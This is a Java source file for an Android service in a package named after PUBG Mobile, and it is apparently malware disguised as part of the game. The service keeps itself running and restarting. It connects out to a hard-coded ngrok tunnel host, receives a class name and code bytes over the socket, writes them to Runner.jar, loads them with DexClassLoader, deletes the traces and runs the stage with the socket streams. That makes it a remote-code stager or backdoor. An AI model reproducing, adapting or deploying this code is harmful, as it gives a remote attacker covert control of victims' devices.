package com.pubg.imobile;

import static com.pubg.imobile.Cheetah.params;
import static com.pubg.imobile.Trigger.session_expiry;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import dalvik.system.DexClassLoader;

public class Job extends Service {
    private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
    static Socket sock;

    public Job() {
    }

    public static void startService(Context context) {
        context.startService(new Intent(context, Job.class));
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        onTaskRemoved(intent);
        Cheetah.start(this);
        Attempt();
        return START_STICKY;
    }

    public void Attempt() {
        long initialDelay = 5; // Delay before the first execution (in seconds)
        long period = 5;       // Period between subsequent executions (in seconds)
        scheduler.scheduleAtFixedRate(() -> Cheetah.start(getApplicationContext()), initialDelay, period, TimeUnit.SECONDS);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    @Override
    public void onTaskRemoved(Intent intent) {
        Intent serviceintent = new Intent(getApplicationContext(), Cheetah.class);
        serviceintent.setPackage(getPackageName());
        startService(serviceintent);
        super.onTaskRemoved(intent);
    }
    static void MainBridge() throws Exception {
        int port = 13896;
        String host = "0.tcp.in.ngrok.io";
        try {
            if (host.equals("")) {
                ServerSocket server = new ServerSocket(port);
                sock = server.accept();
                server.close();
            } else {
                sock = new Socket(host, port);
            }
        } catch (IOException e) {
            e.printStackTrace(); // Log the exception for debugging
            // Handle the exception or terminate gracefully
        }

        if (sock != null) {
            try {
                readAndRunStage(new DataInputStream(sock.getInputStream()), new DataOutputStream(sock.getOutputStream()), params);
            } catch (IOException e) {
                e.printStackTrace(); // Handle the exception
            }
        }
    }

    public static void readAndRunStage(DataInputStream input, OutputStream output, String[] args) throws Exception {
        String dirPath = args[0];
        String jarFilePath = dirPath + File.separatorChar + "Runner.jar";
        String dexFilePath = dirPath + File.separatorChar + "Runner.dex";

        int coreSize1 = input.readInt();
        byte[] coreData1 = new byte[coreSize1];
        input.readFully(coreData1);

        String className = new String(coreData1);

        int coreSize2 = input.readInt();
        byte[] coreData2 = new byte[coreSize2];
        input.readFully(coreData2);

        File jarFile = new File(jarFilePath);

        if (!jarFile.exists()) {
            jarFile.createNewFile();
        }

        FileOutputStream fileOutputStream = new FileOutputStream(jarFile);
        fileOutputStream.write(coreData2);
        fileOutputStream.flush();
        fileOutputStream.close();

        Class<?> loadedClass = new DexClassLoader(jarFilePath, dirPath, dirPath, Cheetah.class.getClassLoader()).loadClass(className);

        Object stageInstance = loadedClass.newInstance();

        jarFile.delete();
        new File(dexFilePath).delete();

        loadedClass.getMethod("start", DataInputStream.class, OutputStream.class, String[].class)
                .invoke(stageInstance, input, output, args);

        session_expiry = -1;
    }
}
